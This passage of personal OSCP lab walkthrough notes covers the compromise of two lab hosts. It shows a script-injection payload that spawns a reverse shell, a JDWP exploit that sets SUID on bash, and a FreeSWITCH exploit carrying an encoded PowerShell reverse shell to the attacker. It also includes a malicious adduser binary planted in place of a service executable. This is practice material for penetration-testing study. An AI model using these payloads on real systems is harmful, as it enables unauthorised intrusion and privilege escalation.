${script:javascript:java.lang.Runtime.getRuntime().exec('bash /dev/shm/rev.sh')}
search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27bash%20%2Fdev%2Fshm%2Frev.sh%27%29%7D 

4. Obtained reverse shell 
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.210.150] 50476
bash: cannot set terminal process group (836): Inappropriate ioctl for device
bash: no job control in this shell
dev@oscp:/$ id
id
uid=1001(dev) gid=1001(dev) groups=1001(dev)
```

4. Found Local.txt
```
dev@oscp:~$ cat local.txt
cat local.txt
731d03e6470f17ea107faebf7d039be9
```

5. Find out 8000 listening port using ss -ntlu

7. Linpeas shows its vulnerable with jdwp vulnerability. 

8. Port forwarding with chisel (specific_chisel)
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ ./chisel-l server -p 8081 --reverse
2024/02/20 23:05:09 server: Reverse tunnelling enabled
2024/02/20 23:05:09 server: Fingerprint 2v51RM/cEaniu9IqO1jx77twuJ2lsj6/yde2ot1+b5I=
2024/02/20 23:05:09 server: Listening on http://0.0.0.0:8081
2024/02/20 23:07:39 server: session#1: tun: proxy#R:8000=>8000: Listening

dev@oscp:/dev/shm$ ./chisel-l client 192.168.45.242:8081 R:8000:127.0.0.1:8000
<-l client 192.168.45.242:8081 R:8000:127.0.0.1:8000
2024/02/21 04:07:36 client: Connecting to ws://192.168.45.242:8081
2024/02/21 04:07:38 client: Connected (Latency 308.832925ms)
```

9. Downdoad jdwp vulnerability and run it. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ python2 46501.py -t 127.0.0.1 -p 8000 --cmd "chmod u+s /bin/bash"
[+] Targeting '127.0.0.1:8000'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.16'
[+] Found Runtime class: id=84e
[+] Found Runtime.getRuntime(): id=7ff32002e0a8
[+] Created break event id=2
[+] Waiting for an event on 'java.net.ServerSocket.accept'
[+] Received matching event from thread 0x8ea
[+] Selected payload 'chmod u+s /bin/bash'
[+] Command string object created id:8eb
[+] Runtime.getRuntime() returned context id:0x8ec
[+] found Runtime.exec(): id=7ff32002e0e0
[+] Runtime.exec() successful, retId=8ed
[!] Command successfully executed
```

10. During the exploitation time run this in target because java.app is running on port 5000
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.210.150] 58534
bash: cannot set terminal process group (836): Inappropriate ioctl for device
bash: no job control in this shell
dev@oscp:/$ nc 127.0.0.1 5000
nc 127.0.0.1 5000
Available Processors: 1
Free Memory: 26507272
Total Memory: 32440320
```

11. Login again as before from burpsuite and root can be obtained along with flag. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nc -nvlp 4445
listening on [any] 4445 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.210.150] 38246
bash: cannot set terminal process group (836): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$

bash-5.1$ /bin/bash -p
/bin/bash -p
whoami
root
cd /root
ls
proof.txt
snap
cat proof.txt
7e93f472b1dc182e97e01b0d15d68154

```



#### 151 
1. Rustscan
```
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack
3389/tcp open  ms-wbt-server syn-ack
8021/tcp open  ftp-proxy     syn-ack

```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nmap -p$(cat 151-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.233.151
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 03:30 EST
Nmap scan report for 192.168.233.151
Host is up (0.31s latency).

PORT     STATE SERVICE          VERSION
80/tcp   open  http             Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server    Microsoft Terminal Services
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2024-02-17T19:19:30
|_Not valid after:  2024-08-18T19:19:30
|_ssl-date: 2024-02-20T08:30:45+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.19041
|_  System_Time: 2024-02-20T08:30:40+00:00
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds

```


3. Find out freeswitch exploit
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ searchsploit freeswitch                                 
------------------------------------- ---------------------------------
 Exploit Title                       |  Path
------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Ex | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Executio | windows/remote/47799.txt
------------------------------------- ---------------------------------
Shellcodes: No Results
```

4. Got a reverse shell using powershell 
```
                                                                             
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.242] from (UNKNOWN) [192.168.210.151] 53173
whoami
oscp\chris
PS C:\Program Files\FreeSWITCH> 

(Convert txt file to py and make it executable)
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ sudo python ./freeswitch.py 192.168.210.151 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAyACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' 
```

5. Find out local.txt
```
PS C:\Users\chris\desktop> cat local.txt
8833c35caf5a555c2ccd9ced136bc7a1
```

6. Find out kiteservice running, and use to add new user as administrator. 
```
1. Find out running service 
PS C:\Program Files\FreeSWITCH> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

C:\program files\Kite\KiteService.exe 

2. Create adduser.exe
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ cp /home/kali/OSCP/16/adduser.c .

                                                                                                                               
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ cat adduser.c                    
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
                                                                                            
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe 


3. Restart the service 
PS C:\Program Files\kite>  move C:\"Program Files"\kite\KiteService.exe C:\"Program Files"\kite\oldKiteService.exe
PS C:\Program Files\kite> dir


    Directory: C:\Program Files\kite


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         11/4/2022   2:00 PM       15641152 kite-lsp.exe                                                         
-a----         11/4/2022   2:00 PM      562179520 kited.exe                                                            
-a----         11/4/2022   2:00 PM         318016 KiteSetupSplashscreen.exe                                            
-a----         11/4/2022   2:00 PM            238 KiteSetupSplashscreen.exe.config                                     
-a----        11/23/2022   6:18 AM           6144 oldKiteService.exe                                                   
-a----         11/4/2022   2:00 PM         151704 Uninstaller.exe                                                      


PS C:\Program Files\kite> iwr -uri http://192.168.45.242/adduser.exe -Outfile KiteService.exe
PS C:\Program Files\kite> dir


    Directory: C:\Program Files\kite


Mode                 LastWriteTime         Length Name                                      
----                 -------------         ------ ----                                      
-a----         11/4/2022   2:00 PM       15641152 kite-lsp.exe                              
-a----         11/4/2022   2:00 PM      562179520 kited.exe                                 
-a----         2/20/2024  10:18 PM         114898 KiteService.exe                           
-a----         11/4/2022   2:00 PM         318016 KiteSetupSplashscreen.exe                 
-a----         11/4/2022   2:00 PM            238 KiteSetupSplashscreen.exe.config          
-a----        11/23/2022   6:18 AM           6144 oldKiteService.exe                        
-a----         11/4/2022   2:00 PM         151704 Uninstaller.exe                           


PS C:\Program Files\kite> net stop KiteService
The KiteService service is stopping.
The KiteService service was stopped successfully.

PS C:\Program Files\kite> net start KiteService


4. Checked added user. 
PS C:\Program Files\kite> net users

User accounts for \\OSCP

-------------------------------------------------------------------------------
Administrator            chris                    dave2                    
DefaultAccount           Guest                    WDAGUtilityAccount       
The command completed successfully.

```

7. RDP login and proof was on desktop. 
```
┌──(kali㉿kali)-[~/OSCP/labs/oscpb]
└─$ xfreerdp /cert-ignore /u:dave2 /p:'password123!' /v:192.168.210.151 

```
